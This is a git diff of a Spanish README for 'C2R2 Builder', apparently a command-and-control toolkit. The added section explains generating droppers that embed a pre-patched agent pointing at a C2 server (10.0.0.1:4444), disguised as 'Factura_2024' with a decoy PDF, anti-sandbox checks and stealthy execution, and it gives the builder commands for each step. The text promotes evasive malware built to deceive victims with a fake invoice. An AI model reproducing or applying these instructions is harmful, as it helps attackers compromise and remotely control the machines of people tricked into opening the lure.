@@ -1,12 +1,28 @@
 # C2R2 Builder v2.0
 
-Generador de agentes y módulos para C2R2.
+Generador de agentes, droppers y módulos para C2R2.
 
-## ⚡ NUEVO: Binary Patching (v2.0+)
+## ⚡ NUEVO: Standalone Dropper Generator (v2.0+)
+
+**¡Ya no necesitas Rust ni donut para crear droppers!**
+
+El builder ahora puede **generar droppers** que embeden un agente pre-compilado:
+
+```bash
+# 1. Parchear agente con IP correcta
+./builder patch-agent --input agent.exe --output mi_agente.exe --server 10.0.0.1:4444
+
+# 2. Generar dropper (NO requiere Rust)
+./builder generate-dropper --agent mi_agente.exe --template dropper.exe --output Factura_2024
+```
+
+✅ **El dropper incluye:** anti-sandbox, PDF de señuelo, ejecución stealthy.
+
+## ⚡ Binary Patching (v2.0+)
 
 **¡Ya no necesitas Rust para configurar agentes!**
 
-El builder ahora puede **parchear binarios pre-compilados** para cambiar la IP del servidor sin recompilar:
+El builder puede **parchear binarios pre-compilados** para cambiar la IP del servidor:
 
 ```bash
 # Configurar un agente existente con nueva IP
@@ -17,11 +33,9 @@ El builder ahora puede **parchear binarios pre-compilados** para cambiar la IP d
 
 Ver [USAGE.md](USAGE.md) para documentación completa.
 
-## ⚠️ IMPORTANTE - Dos Formas de Usar el Builder
+## ⚠️ IMPORTANTE - Formas de Usar el Builder
 
-### 🎯 Opción 1: Parchear Binario (Recomendado para Usuarios Finales)
-
-**Para:** Usuarios que descargaron un release de GitHub
+### 🎯 Opción 1: Parchear Agente (Recomendado)
 
 ```bash
 ./builder patch-agent \
@@ -30,13 +44,16 @@ Ver [USAGE.md](USAGE.md) para documentación completa.
     --server 192.168.1.100:4444
 ```
 
-**Ventajas:**
-- No requiere Rust
-- No requiere MinGW
-- Funciona en cualquier plataforma
-- Configuración en segundos
+### 🎯 Opción 2: Generar Dropper (Recomendado)
 
-### 🛠️ Opción 2: Compilar desde Código Fuente
+```bash
+./builder generate-dropper \
+    --agent configured_agent.exe \
+    --template dropper.exe \
+    --output Factura_2024
+```
+
+### 🛠️ Opción 3: Compilar desde Código Fuente
 
 **Para:** Desarrolladores con código fuente completo
 
